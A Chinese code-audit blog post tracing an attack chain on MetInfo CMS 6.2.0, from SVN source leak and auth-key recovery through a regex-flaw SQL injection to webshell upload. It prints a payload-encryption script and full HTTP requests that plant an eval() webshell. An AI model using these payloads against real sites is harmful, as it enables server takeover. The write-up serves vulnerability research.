---
title: "metinfo 6.2.0正则匹配不严谨导致注入+getshell组合拳"
date: 2019-09-27T21:46:37+08:00
lastmod: 2019-09-27T21:46:37+08:00
draft: false
tags: ['code']
categories: ['代码审计']
comment: true
---

组合拳攻击metinfo

<!--more-->

今天公司做技术分享，分享了项目中的一个攻击metinfo的案例，很有意思的攻击链，记录下。

# svn泄露

svn是一个开放源代码的版本控制系统，如果在网站中存在`.svn`目录，那么我们可以拿到网站的源代码，方便审计。关于svn泄露需要注意的是SVN 版本 >1.7 时，Seay的工具不能dump源码了。可以用@admintony师傅的脚本来利用 https://github.com/admintony/svnExploit/

在目标站中发现了`http://php.local/.svn/`目录泄露源代码，发现是metinfo cms，拿到了位于`config/config_safe.php`中的key，这个key起到了很大作用。

什么是key呢？为什么要有这个key呢？

在metinfo安装完成后，会在`config/config_safe.php`写入一个key，这个key是用来加密解密账户信息的，你可以在`app/system/include/class/auth.class.php`看到加解密算法。

![20190927220929](https://y4er.com/img/uploads/20190927220929.png)

可以看到加解密采用了`$this->auth_key.$key`作为盐值，`$key`默认为空，那么这个`$this->auth_key`在哪定义的呢？

config/config.inc.php:109

![20190927221247](https://y4er.com/img/uploads/20190927221247.png)

有了这个key，我们可以自己针对性去加密解密程序密文。

有什么用呢？大部分的cms都会有全局参数过滤，而metinfo的全局过滤简直变态，我们很难直接从request中找到可用的sql注入，**而加了密之后的参数一半不会再进行过滤了**，我们可以找下可控的加密参数。

# 正则匹配导致的注入

全局搜索`$auth->decode`寻找可控的参数，并且不走过滤的。

![20190927221832](https://y4er.com/img/uploads/20190927221832.png)

app/system/user/web/getpassword.class.php:93

```php
public function dovalid() {
    global $_M;
    $auth = load::sys_class('auth', 'new');
    $email = $auth->decode($_M['form']['p']);
    if(!is_email($email))$email = '';
    if($email){
        if($_M['form']['password']){
            $user = $this->userclass->get_user_by_email($email);
            if($user){
                if($this->userclass->editor_uesr_password($user['id'],$_M['form']['password'])){
                    okinfo($_M['url']['login'], $_M['word']['modifypasswordsuc']);
                }else{
                    okinfo($_M['url']['login'], $_M['word']['opfail']);
                }
            }else{
                okinfo($_M['url']['login'], $_M['word']['NoidJS']);
            }
        }
        require_once $this->view('app/getpassword_mailset',$this->input);
    }else{
        okinfo($_M['url']['register'], $_M['word']['emailvildtips2']);
    }
}
```

可以看到`$email`直接从`$_M['form']['p']`中经过`$auth->decode` **解密**获取，并没有进行过滤，然后在`get_user_by_email($email)`中代入数据库查询。但是经过了`is_email($email)`判断是否为正确的邮箱地址。

跟进app/system/include/function/str.func.php:26

```php
function is_email($email){
	$flag = true;
	$patten = '/[\w-]+@[\w-]+\.[a-zA-Z\.]*[a-zA-Z]$/';
	if(preg_match($patten, $email) == 0){
		$flag = false;
	}
	return $flag;
}
```

很正常的正则表达式，**但是唯一缺少的是`^`起始符！**那么我们构造如`' and 1=1-- 1@qq.com`也会返回true！

email要经过`$auth->decode`解密，这个时候我们的key就派上用场了，我们可以使用`$auth->encode()`来加密我们的payload传进去，构成注入。

将auth类自己搞一份出来。

```php
<?php
function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0){
    $ckey_length = 4;
    $key = md5($key ? $key : UC_KEY);
    $keya = md5(substr($key, 0, 16));
    $keyb = md5(substr($key, 16, 16));
    $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';
    $cryptkey = $keya.md5($keya.$keyc);
    $key_length = strlen($cryptkey);
    $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
    $string_length = strlen($string);
    $result = '';
    $box = range(0, 255);
    $rndkey = array();
    for($i = 0; $i <= 255; $i++) {
        $rndkey[$i] = ord($cryptkey[$i % $key_length]);
    }
    for($j = $i = 0; $i < 256; $i++) {
        $j = ($j + $box[$i] + $rndkey[$i]) % 256;
        $tmp = $box[$i];
        $box[$i] = $box[$j];
        $box[$j] = $tmp;
    }

    for($a = $j = $i = 0; $i < $string_length; $i++) {
        $a = ($a + 1) % 256;
        $j = ($j + $box[$a]) % 256;
        $tmp = $box[$a];
        $box[$a] = $box[$j];
        $box[$j] = $tmp;
        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
    }

    if($operation == 'DECODE') {
        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
            return substr($result, 26);
        } else {
            return '';
        }
    }else{
        return $keyc.str_replace('=', '', base64_encode($result));
    }
}

print_r(urlencode(authcode($_GET['p'],'ENCODE','cqQWPRhV91To7PmrI5Dd3FGIxjMQpLmt','0')));
```

![20190927230507](https://y4er.com/img/uploads/20190927230507.png)

需要注意这个`123@qq.com`是你自己注册的用户，如果`met_user`表中不存在一条记录，是延时不了的。

![20190927230659](https://y4er.com/img/uploads/20190927230659.png)

延时成功，你也可以构造布尔盲注，到此为止就是注入的部分，但是我们的目标是拿权限，一个注入就满足了？

# 组合拳

app/system/include/class/web.class.php:467 省略部分代码

```php
public function __destruct(){
    global $_M;
    //读取缓冲区数据
    $output = str_replace(array('<!--<!---->','<!---->','<!--fck-->','<!--fck','fck-->','',"\r",substr($admin_url,0,-1)),'',ob_get_contents());
    ob_end_clean();//清空缓冲区
...
    if($_M['form']['html_filename'] && $_M['form']['metinfonow'] == $_M['config']['met_member_force']){
        //静态页
        $filename = urldecode($_M['form']['html_filename']);
        if(stristr(PHP_OS,"WIN")) {
            $filename = @iconv("utf-8", "GBK", $filename);
        }
        if(stristr($filename, '.php')){
            jsoncallback(array('suc'=>0));
        }
        if(file_put_contents(PATH_WEB.$filename, $output)){
            jsoncallback(array('suc'=>1));
        }else{
            jsoncallback(array('suc'=>0));
        }
    }else{
        echo $output;//输出内容
    }
...
}
```

在前台基类web.class.php中有`__destruct`魔术方法，而在这个方法中使用`file_put_contents(PATH_WEB.$filename, $output`写入文件，其中`$output`是通过`ob_get_contents()`获取的缓冲区数据，而`$filename`是从`$_M['form']['html_filename']`拿出来的，我们可控。

但是有一个if条件`$_M['form']['metinfonow'] == $_M['config']['met_member_force']`，这个`met_member_force`在哪呢？在数据库里，我们可以通过刚才的注入拿到！

![20190927232524](https://y4er.com/img/uploads/20190927232524.png)

那么我们现在的目的就变为怎么去控制`$output`也就是缓冲区的值。

> ob_start()在服务器打开一个缓冲区来保存所有的输出。所以在任何时候使用echo，输出都将被加入缓冲区中，直到程序运行结束或者使用ob_flush()来结束。

也就是说我们只要找到web.class.php或者继承web.class.php的子类中有可控的echo输出，配合刚才的注入便可以写入shell。

全局搜索`extends web`寻找子类，在子类中寻找可控echo输出，最终找到的是`app/system/include/module/uploadify.class.php`的doupfile()方法

```php
public function set_upload($info){
    global $_M;
    $this->upfile->set('savepath', $info['savepath']);
    $this->upfile->set('format', $info['format']);
    $this->upfile->set('maxsize', $info['maxsize']);
    $this->upfile->set('is_rename', $info['is_rename']);
    $this->upfile->set('is_overwrite', $info['is_overwrite']);
}
...
public function upload($formname){
    global $_M;
    $back = $this->upfile->upload($formname);
    return $back;
}
...
public function doupfile(){
    global $_M;
    $this->upfile->set_upfile();
    $info['savepath'] = $_M['form']['savepath'];
    $info['format'] = $_M['form']['format'];
    $info['maxsize'] = $_M['form']['maxsize'];
    $info['is_rename'] = $_M['form']['is_rename'];
    $info['is_overwrite'] = $_M['form']['is_overwrite'];
    $this->set_upload($info);
    $back = $this->upload($_M['form']['formname']);
    if($_M['form']['type']==1){
        if($back['error']){
            $back['error'] = $back['errorcode'];
        }else{
            $backs['path'] = $back['path'];

            $backs['append'] = 'false';
            $back = $backs;
        }
    }
    $back['filesize'] =  round(filesize($back['path'])/1024,2);
    echo jsonencode($back);
}
...
```

echo的$back变量是从`$_M['form']['formname']`取出来的，可控，向上推看back变量的取值由`$this->upfile->upload($formname)`决定，跟进。

```php
public function upload($form = '') {
    global $_M;
    if($form){
        foreach($_FILES as $key => $val){
            if($form == $key){
                $filear = $_FILES[$key];
            }
        }
    }
    if(!$filear){
        foreach($_FILES as $key => $val){
            $filear = $_FILES[$key];
            break;
        }
    }

    //是否能正常上传
    if(!is_array($filear))$filear['error'] = 4;
    if($filear['error'] != 0 ){
        $errors = array(
            0 => $_M['word']['upfileOver4'],
            1 => $_M['word']['upfileOver'],
            2 => $_M['word']['upfileOver1'],
            3 => $_M['word']['upfileOver2'],
            4 => $_M['word']['upfileOver3'],
            6 => $_M['word']['upfileOver5'],
            7 => $_M['word']['upfileOver5']
        );
        $error_info[]= $errors[$filear['error']] ? $errors[$filear['error']] : $errors[0];
        return $this->error($errors[$filear['error']]);
    }
    ...
    //文件大小是否正确{}
    if ($filear["size"] > $this->maxsize || $filear["size"] > $_M['config']['met_file_maxsize']*1048576) {
        return $this->error("{$_M['word']['upfileFile']}".$filear["name"]." {$_M['word']['upfileMax']} {$_M['word']['upfileTip1']}");
    }
    //文件后缀是否为合法后缀
    $this->getext($filear["name"]); //获取允许的后缀
    if (strtolower($this->ext)=='php'||strtolower($this->ext)=='aspx'||strtolower($this->ext)=='asp'||strtolower($this->ext)=='jsp'||strtolower($this->ext)=='js'||strtolower($this->ext)=='asa') {
        return $this->error($this->ext." {$_M['word']['upfileTip3']}");
    }
    ...
}
```

省略部分代码

我们要看return回去的值就是back变量的值，所以重点关注return的东西看是否可控。

首先是正常foreach取出上传文件的信息，然后判断是否能正常上传-文件大小是否正确-文件后缀是否为合法后缀，如果有错就return。到这里有两种思路。

## 超出文件大小getshell

![20190927234118](https://y4er.com/img/uploads/20190927234118.png)

在后台中最大文件大小是8m，如果我们上传一个超出8m的文件，那么upload()函数就会`return $this->error("{$_M['word']['upfileFile']}".$filear["name"]." {$_M['word']['upfileMax']} {$_M['word']['upfileTip1']}");` 而这个`$filear["name"]`是我们可控的，在foreach中赋值的。

那么这样我们就可以把`$filear["name"]`改为shell，然后return回去，赋值给$back，echo进缓冲区，最后file_put_contents拿到shell，完美的利用链。

但是这个8m太大了，**我们可以通过注入进后台把这个限制改为0.0008**

构造下payload，**需要注意`metinfonow`参数是上文中从数据库中取出的`met_member_force`**

```http
POST /admin/index.php?c=uploadify&m=include&a=doupfile&lang=cn&metinfonow=xwtpwmp&html_filename=1.php HTTP/1.1
Host: php.local
Content-Length: 1120
Origin: http://php.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8tQiXReYsQYXHadW
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundary8tQiXReYsQYXHadW
Content-Disposition: form-data; name="test"; filename="<?php eval($_POST[1]);?>"
Content-Type: image/jpeg

testtesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttest
------WebKitFormBoundary8tQiXReYsQYXHadW--
```

![20190927235251](https://y4er.com/img/uploads/20190927235251.png)

![20190927235336](https://y4er.com/img/uploads/20190927235336.png)

![20190927235402](https://y4er.com/img/uploads/20190927235402.png)

## 无后缀getshell

@mochazz师傅在先知上分享了一篇metinfo6.1.3的getshell，我自己测试在6.2.0中已经修复，不过还是提一下。

问题出在 app/system/include/class/upfile.class.php:139 getext()函数

如果不是合法后缀会`return $this->error($this->ext." {$_M['word']['upfileTip3']}")`，而`$this->ext`经过`getext()`函数，跟进

```php
protected function getext($filename) {
    if ($filename == "") {
        return ;
    }
    $ext = explode(".", $filename);
    $ext = $ext[count($ext) - 1];
    return $this->ext = $ext;
}
```

直接`return $ext`，那么我们上传一个无后缀的文件，文件名写一句话就可以getshell

![20190928000955](https://y4er.com/img/uploads/20190928000955.png)

![20190928001104](https://y4er.com/img/uploads/20190928001104.png)

payload

```http
POST /admin/index.php?c=uploadify&m=include&a=doupfile&lang=cn&metinfonow=xwtpwmp&html_filename=1.php HTTP/1.1
Host: php.local
Content-Length: 194
Origin: http://php.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8tQiXReYsQYXHadW
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: XDEBUG_SESSION=PHPSTORM
Connection: close

------WebKitFormBoundary8tQiXReYsQYXHadW
Content-Disposition: form-data; name="test"; filename="<?php phpinfo();?>"
Content-Type: image/jpeg

test
------WebKitFormBoundary8tQiXReYsQYXHadW--
```

而在6.2.0中，加入了一行正则判断后缀，绕不过去，无法getshell

```php
protected function getext($filename) {
    if ($filename == "") {
        return ;
    }
    $ext = explode(".", $filename);
    $ext = $ext[count($ext) - 1];
    if (preg_match("/^[0-9a-zA-Z]+$/u", $ext)) {
        return $this->ext = $ext;
    }
    return $this->ext = '';
}
```

# 总结

1. svn泄露分版本
2. 注册是邮件的正则匹配问题
3. 参数加密一般不走全局过滤 找找注入
4. 关注echo和ob_get_contents()函数 说不定能写shell呢

参考链接

1. https://nosec.org/home/detail/2436.html
2. https://xz.aliyun.com/t/4425



**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**